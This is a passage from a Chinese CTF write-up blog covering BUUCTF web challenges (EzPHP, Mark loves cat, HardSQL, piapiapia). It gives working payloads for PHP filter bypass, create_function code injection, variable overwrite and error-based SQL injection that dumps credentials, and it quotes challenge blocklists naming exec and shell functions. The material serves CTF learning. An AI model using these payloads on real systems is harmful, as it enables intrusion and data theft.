class="string">'Sm'</span>, <span class="string">'Eu'</span>, <span class="string">'Gd'</span>, <span class="string">'Tb'</span>, <span class="string">'Dy'</span>, <span class="string">'Ho'</span>, <span class="string">'Er'</span>, <span class="string">'Tm'</span>, </span><br><span class="line">                  <span class="string">'Yb'</span>, <span class="string">'Lu'</span>, <span class="string">'Hf'</span>, <span class="string">'Ta'</span>, <span class="string">'W'</span>, <span class="string">'Re'</span>, <span class="string">'Os'</span>, <span class="string">'Ir'</span>, <span class="string">'Pt'</span>, <span class="string">'Au'</span>, <span class="string">'Hg'</span>, <span class="string">'Tl'</span>, <span class="string">'Pb'</span>, <span class="string">'Bi'</span>, <span class="string">'Po'</span>, <span class="string">'At'</span>, <span class="string">'Rn'</span>, </span><br><span class="line">                  <span class="string">'Fr'</span>, <span class="string">'Ra'</span>, <span class="string">'Ac'</span>, <span class="string">'Th'</span>, <span class="string">'Pa'</span>, <span class="string">'U'</span>, <span class="string">'Np'</span>, <span class="string">'Pu'</span>, <span class="string">'Am'</span>, <span class="string">'Cm'</span>, <span class="string">'Bk'</span>, <span class="string">'Cf'</span>, <span class="string">'Es'</span>, <span class="string">'Fm'</span>,<span class="string">'Md'</span>, <span class="string">'No'</span>, <span class="string">'Lr'</span>,</span><br><span class="line">                  <span class="string">'Rf'</span>, <span class="string">'Db'</span>, <span class="string">'Sg'</span>, <span class="string">'Bh'</span>, <span class="string">'Hs'</span>, <span class="string">'Mt'</span>, <span class="string">'Ds'</span>, <span class="string">'Rg'</span>, <span class="string">'Cn'</span>, <span class="string">'Nh'</span>, <span class="string">'Fl'</span>, <span class="string">'Mc'</span>, <span class="string">'Lv'</span>, <span class="string">'Ts'</span>, <span class="string">'Og'</span>, <span class="string">'Uue'</span>)</span><br><span class="line"><span class="keyword">for</span> symbol <span class="keyword">in</span> elements:</span><br><span class="line">    link = <span class="string">"http://e3ddcd4a-57e2-4be0-97fc-886301a6774f.node3.buuoj.cn/"</span> + symbol + <span class="string">".php"</span></span><br><span class="line">    <span class="comment">#print(link)</span></span><br><span class="line">    response = req.get(link)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        print(response.text, end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/24/BJDCTF-2nd-web/17.png" alt><br>最后得到</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">A<span class="symbol">nd_th3</span>_<span class="number">3</span>LemE<span class="symbol">nt5</span>_w<span class="number">1</span>LL_De<span class="number">5</span>tR<span class="number">0</span>y_y<span class="number">0</span>u.php</span><br></pre></td></tr></table></figure>

<p>访问后得到flag</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-web二</title>
    <url>/2020/04/04/BUU-web%E4%BA%8C/</url>
    <content><![CDATA[<p>BUUCTF-web刷题(二)</p>
<p><strong>[BJDCTF2020]EzPHP</strong><br>知识点：PHP代码审计 、绕过QUERY_STRING、create_function()代码注入</p>
<p><strong>[BJD-2020]Mark loves cat</strong><br>知识点：PHP变量覆盖漏洞</p>
<p><strong>[极客大挑战2019]HardSQL</strong><br>知识点：sql报错注入 、left()right()语句查询拼接</p>
<p><strong>[0CTF 2016]piapiapia</strong><br>知识点：PHP反序列化字符逃逸</p>
<p><strong>[BUUCTF 2018]Online Tool</strong><br>知识点：escapeshellarg()和escapeshellcmd()函数引发的问题</p>
<p><strong>[GXYCTF2019]BabySQli</strong><br>知识点：联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据</p>
<p><strong>[安洵杯]easy_ serialize_ php</strong><br>知识点：user+function逃逸</p>
<p><strong>[BJDCTF2020]ZJCTF，不过如此</strong><br>知识点：<code>preg_replace  /e</code>的命令执行漏洞</p>
<p><strong>[GXYCTF2019]BabyUpload</strong><br>知识点：.htaccess文件上传</p>
<p><strong>[ZJCTF 2019]NiZhuanSiWei</strong><br>知识点：简单反序列化</p>
<a id="more"></a>

<h1 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h1><p>打开题目查看源码，发现一个base32编码,解码后为一个目录，访问得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (       preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="绕过QUERY-STRING"><a href="#绕过QUERY-STRING" class="headerlink" title="绕过QUERY_STRING"></a>绕过QUERY_STRING</h2><p>先了解一下$_SERVER[‘QUERY_STRING’]</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>，http:<span class="comment">//localhost/aaa/ (打开aaa中的index.php)</span></span><br><span class="line">结果：</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'QUERY_STRING'</span>] = <span class="string">""</span>;</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'REQUEST_URI'</span>] = <span class="string">"/aaa/"</span>;</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'SCRIPT_NAME'</span>] = <span class="string">"/aaa/index.php"</span>;</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'PHP_SELF'</span>] = <span class="string">"/aaa/index.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>，http:<span class="comment">//localhost/aaa/?p=222 (附带查询)</span></span><br><span class="line">结果：</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'QUERY_STRING'</span>] = <span class="string">"p=222"</span>;</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'REQUEST_URI'</span>] = <span class="string">"/aaa/?p=222"</span>;</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'SCRIPT_NAME'</span>] = <span class="string">"/aaa/index.php"</span>;</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'PHP_SELF'</span>] = <span class="string">"/aaa/index.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>，http:<span class="comment">//localhost/aaa/index.php?p=222&amp;q=333</span></span><br><span class="line">结果：</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'QUERY_STRING'</span>] = <span class="string">"p=222&amp;q=333"</span>;</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'REQUEST_URI'</span>] = <span class="string">"/aaa/index.php?p=222&amp;q=333"</span>;</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'SCRIPT_NAME'</span>] = <span class="string">"/aaa/index.php"</span>;</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">'PHP_SELF'</span>] = <span class="string">"/aaa/index.php"</span>;</span><br><span class="line"></span><br><span class="line">由实例可知：</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">"QUERY_STRING"</span>] 获取查询 语句，实例中可知，获取的是?后面的值</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">"REQUEST_URI"</span>] 获取 http:<span class="comment">//localhost 后面的值，包括/</span></span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">"SCRIPT_NAME"</span>] 获取当前脚本的路径，如：index.php</span><br><span class="line"><span class="symbol">$</span>_SERVER[<span class="string">"PHP_SELF"</span>] 当前正在执行脚本的文件名</span><br></pre></td></tr></table></figure>

<p>由于<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不会进行URLDecode，而<code>$_GET[]</code>会，所以只要进行url编码即可绕过：<br><img src="/2020/04/04/BUU-web%E4%BA%8C/1.png" alt></p>
<p>接着是file传参，需要满足正则和===<br>这儿由于限制了http和https，所以我们不能使用vps上的文件，这儿使用php://input和data://都可以~~</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if (<span class="name">preg_match</span>('/^aqua_is_cute$/', $_GET['debu']) <span class="symbol">&amp;&amp;</span> $_GET['debu'] !== 'aqua_is_cute')</span><br></pre></td></tr></table></figure>

<p>这儿直接在后面加%0a就可以绕过</p>
<p>$_REQUEST这儿需要满足参数的值不能有字母<br>由于之前接收的参数为$_GET，而这儿接收的参数为$_REQUEST，所以我们只需要POST一些相同的参数，覆盖掉$_GET的参数就行了，这是因为$_REQUEST的解析是有一定顺序的，应该是先解析$_GET，再解析$_POST，这样我们就能绕过这个点<br>sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd,这个<code>===</code>我们可以使用数组来绕过</p>
<p>综合一下上面的payload</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">file</span>=data://text/plain,debu_debu_aqua<span class="variable">&amp;debu</span>=aqua_is_cute</span><br><span class="line"><span class="variable">&amp;shana</span>[]=1<span class="variable">&amp;passwd</span>[]=</span><br></pre></td></tr></table></figure>

<p>url编码后</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">%64</span><span class="symbol">%61</span><span class="symbol">%74</span><span class="symbol">%61</span><span class="symbol">%3</span>a<span class="symbol">%2</span>f<span class="symbol">%2</span>f<span class="symbol">%74</span><span class="symbol">%65</span><span class="symbol">%78</span><span class="symbol">%74</span><span class="symbol">%2</span>f<span class="symbol">%70</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%61</span><span class="symbol">%69</span><span class="symbol">%6</span>e<span class="symbol">%2</span><span class="keyword">c</span><span class="symbol">%64</span><span class="symbol">%65</span><span class="symbol">%62</span><span class="symbol">%75</span><span class="symbol">%5</span>f<span class="symbol">%64</span><span class="symbol">%65</span><span class="symbol">%62</span><span class="symbol">%75</span><span class="symbol">%5</span>f<span class="symbol">%61</span><span class="symbol">%71</span><span class="symbol">%75</span><span class="symbol">%61</span>&amp;<span class="symbol">%64</span><span class="symbol">%65</span><span class="symbol">%62</span><span class="symbol">%75</span>=<span class="symbol">%61</span><span class="symbol">%71</span><span class="symbol">%75</span><span class="symbol">%61</span><span class="symbol">%5</span>f<span class="symbol">%69</span><span class="symbol">%73</span><span class="symbol">%5</span>f<span class="symbol">%63</span><span class="symbol">%75</span><span class="symbol">%74</span><span class="symbol">%65</span><span class="symbol">%0</span>A&amp;<span class="symbol">%73</span><span class="symbol">%68</span><span class="symbol">%61</span><span class="symbol">%6</span>e<span class="symbol">%61</span>[]=<span class="number">1</span>&amp;<span class="symbol">%70</span><span class="symbol">%61</span><span class="symbol">%73</span><span class="symbol">%73</span><span class="symbol">%77</span><span class="symbol">%64</span>[]=</span><br></pre></td></tr></table></figure>

<p>同时要进行post传参</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">file=<span class="number">4</span>&amp;debu=<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/BUU-web%E4%BA%8C/2.png" alt></p>
<h2 id="create-function-代码注入"><a href="#create-function-代码注入" class="headerlink" title="create_function()代码注入"></a>create_function()代码注入</h2><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">if(preg_match('/^[a-z0-9]<span class="symbol">*</span>$/isD', $code) ||</span><br><span class="line">    preg_match('/fil|<span class="string">cat</span>|<span class="string">more</span>|<span class="string">tail</span>|<span class="string">tac</span>|<span class="string">less</span>|<span class="string">head</span>|<span class="string">nl</span>|<span class="string">tailf</span>|<span class="string">ass</span>|<span class="string">eval</span>|<span class="string">sort</span>|<span class="string">shell</span>|<span class="string">ob</span>|<span class="string">start</span>|<span class="string">mail</span>|<span class="string">\`</span>|<span class="string">\&#123;</span>|<span class="string">\%</span>|<span class="string">x</span>|<span class="string">\&amp;</span>|<span class="string">\$</span>|<span class="string">\*</span>|<span class="string">\</span>||<span class="string">\&lt;</span>|<span class="string">\"</span>|<span class="string">\'</span>|<span class="string">\=</span>|<span class="string">\?</span>|<span class="string">sou</span>|<span class="string">show</span>|<span class="string">cont</span>|<span class="string">high</span>|<span class="string">reverse</span>|<span class="string">flip</span>|<span class="string">rand</span>|<span class="string">scan</span>|<span class="string">chr</span>|<span class="string">local</span>|<span class="string">sess</span>|<span class="string">id</span>|<span class="string">source</span>|<span class="string">arra</span>|<span class="string">head</span>|<span class="string">light</span>|<span class="string">print</span>|<span class="string">echo</span>|<span class="string">read</span>|<span class="string">inc</span>|<span class="string">flag</span>|<span class="string">1f</span>|<span class="string">info</span>|<span class="string">bin</span>|<span class="string">hex</span>|<span class="string">oct</span>|<span class="string">pi</span>|<span class="string">con</span>|<span class="string">rot</span>|<span class="string">input</span>|<span class="string">\.</span>|<span class="string">log</span>|<span class="string">\^/i', $arg) ) &#123;</span></span><br><span class="line"><span class="string">    die("&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=");</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">    include "flag.php";</span></span><br><span class="line"><span class="string">    $code('', $arg);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>其中<code>$code</code>，<code>$arg</code>可控，自然想到<code>create_function()</code></p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line"><span class="variable">$myfunc</span> = create_function(<span class="string">'<span class="variable">$a</span>, <span class="variable">$b</span>'</span>, <span class="string">'return <span class="variable">$a</span>+<span class="variable">$b</span>;'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunc</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是如果第二个参数没有限制的话，如<code>$code=return $a+$b;}eval($_POST[&#39;cmd&#39;]);//</code>，就变成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunc</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<p>可执行任意代码</p>
<p><code>get_defined_vars()</code>获取所有变量，配合<code>require()</code>获得flag</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">require(<span class="name">base64_decode</span>(<span class="name">MWZsYWcucGhw</span>))<span class="comment">;</span></span><br><span class="line">var_dump(<span class="name">get_defined_vars</span>())<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>此处flag所在文件名也可以通过<code>^</code>或<code>~</code>的方式构造，也可以通过GET方法传入，再通过<code>get_defined_vars()</code>配合各种数组操作取出来</p>
<p>define+fopen()+fgets()读文件</p>
<p>没ban掉<code>fopen()</code>，可以<code>fgets()</code>读取文件，但是这个文件指针需要移动就不能读取完整文件，<code>$</code>被禁无法定义变量</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">flag[code]=create_function&amp;flag[arg]=;&#125;define(aaa,<span class="keyword">fopen</span>(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r))；<span class="keyword">while</span>(!<span class="keyword">feof</span>(aaa))var_dump(fgets(aaa));<span class="keyword">fclose</span>(aaa);</span><br></pre></td></tr></table></figure>

<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;&#125;define(aaa,<span class="keyword">fopen</span>(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r));<span class="keyword">while</span>(!<span class="keyword">feof</span>(aaa))var_dump(fgets(aaa));<span class="keyword">fclose</span>(aaa);%23</span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<blockquote>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">/<span class="number">1</span>nD3x.php?<span class="keyword">file</span>=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=<span class="number">1</span>&amp;%70%61%73%73%77%64[]=<span class="number">2</span>&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;&#125;define(aaa,<span class="keyword">fopen</span>(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r));<span class="keyword">while</span>(!<span class="keyword">feof</span>(aaa))var_dump(fgets(aaa));<span class="keyword">fclose</span>(aaa);%23</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>POST:file=4&amp;debu=5</p>
</blockquote>
<p>然后查看源码就得到flag了，这里create_function其实还是有点懵（url编码看起很乱，不想看了）。第一次遇到，就当了解一下吧。<br><img src="/2020/04/04/BUU-web%E4%BA%8C/23.png" alt></p>
<h1 id="BJD-2020-Mark-loves-cat"><a href="#BJD-2020-Mark-loves-cat" class="headerlink" title="[BJD-2020]Mark loves cat"></a>[BJD-2020]Mark loves cat</h1><p>打开后扫描目录发现git源码泄露，使用githack下载下来<br><img src="/2020/04/04/BUU-web%E4%BA%8C/3.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>

<p>这里有个变量覆盖漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POST：</p>
<blockquote>
<p>$flag=flag    就会变成   $$flag=$flag</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GET:</p>
<blockquote>
<p>yds=flag     就会变成   $yds=$flag</p>
</blockquote>
<p>这里只要没有flag参数就会执行exit($yds),这样我们就可以输出flag了<br>payload</p>
<blockquote>
<p>GET:yds=flag</p>
</blockquote>
<p>查看源码得到flag</p>
<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>这道题使用报错注入，注了半天，才发现注入点在username..</p>
<p>payload</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">查数据</span><br><span class="line">?username=admin'or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(username,'~',password))from(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">21</span></span><br></pre></td></tr></table></figure>

<p>但是只查到了一半，另一半要使用left()right()语句查询拼接</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>'or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(right(password,<span class="number">25</span>)))from(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=admin</span><br></pre></td></tr></table></figure>

<p>这里过滤了空格和=<br>=可以使用like代替<br>空格可以使用括号<br><img src="/2020/04/04/BUU-web%E4%BA%8C/4.png" alt></p>
<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><h2 id="一些知识点"><a href="#一些知识点" class="headerlink" title="一些知识点"></a>一些知识点</h2><h3 id="url传递数组"><a href="#url传递数组" class="headerlink" title="url传递数组"></a>url传递数组</h3><p>当我们要向服务器传递数组时，我们可以通过<br><code>http://127.0.0.1/index.php?a[]=hello&amp;a[]=world</code><br>来传递，这样，在后端，<br><code>$a = $_GET[&#39;a&#39;];</code><br>就可以接收到 $a[0]=“hello”, $a[1]=“world”</p>
<h3 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h3><p>foreach (array_expression as $value)</p>
<p>foreach (array_expression as $key =&gt; $value)</p>
<p>第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p>
<p>第二种格式做同样的事，只除了当前单元的值赋给$value外，键名也会在每次循环中被赋给变量 $key。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">    $value = $value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">                $ arr is now <span class="keyword">array</span>(<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>)</span><br><span class="line"><span class="keyword">unset</span>($value);  最后取消掉引用</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"one"</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    <span class="string">"two"</span> =&gt; <span class="number">2</span>,</span><br><span class="line">    <span class="string">"three"</span> =&gt; <span class="number">3</span>,</span><br><span class="line">    <span class="string">"seventeen"</span> =&gt; <span class="number">17</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">foreach</span> ($a <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\$a[$k] =&gt; $v.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">输出 $a[one] =&gt; <span class="number">1.</span> $a[two] =&gt; <span class="number">2.</span> $a[three] =&gt; <span class="number">3.</span> $a[seventeen] =&gt; <span class="number">17.</span></span><br></pre></td></tr></table></figure>

<h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><blockquote>
<p>unserialize(str) 会忽略能够正常序列化的字符串后面的字符串。也是这到题最厉害的一点。像这样的一个字符串，我们可以可以不用反序列话，就能知道它反序列化后是什么，因为它是有规律的。<br>a:4:{s:5:“phone”;s:11:“11111111111”;s:5:“email”;s:11:“<a href="mailto:1a2s@qq.com" target="_blank" rel="noopener">1a2s@qq.com</a>”;s:8:“nickname”;s:3:“123”;s:5:“photo”;s:39:“upload/f3b94e88bd1bd325af6f62828c8785dd”;}<br>a:4指的是由一个数组序列化而来，并且有4个值。如果是对象的话，好像是把a改成了O。然后就是一个键值名，一个变量值：<br>s:5:”phone”;第一个键值名，是string类型的，长度为五，s:11:”11111111111”;第一个变量值，string类型，长度为11.这就是它的规律。如果我们在这个序列化字符串的后面，再加上一些字符，后面的字符是不会被反序列化的</p>
</blockquote>
<p>这道题进去后是一个登陆框，以为是sql注入，但是测试后并没有什么发现。然后再扫目录中发现了源码泄露和注册页面</p>
<p><img src="/2020/04/04/BUU-web%E4%BA%8C/5.png" alt><br>将源码下载下来</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>index.php=&gt;profile.php</p>
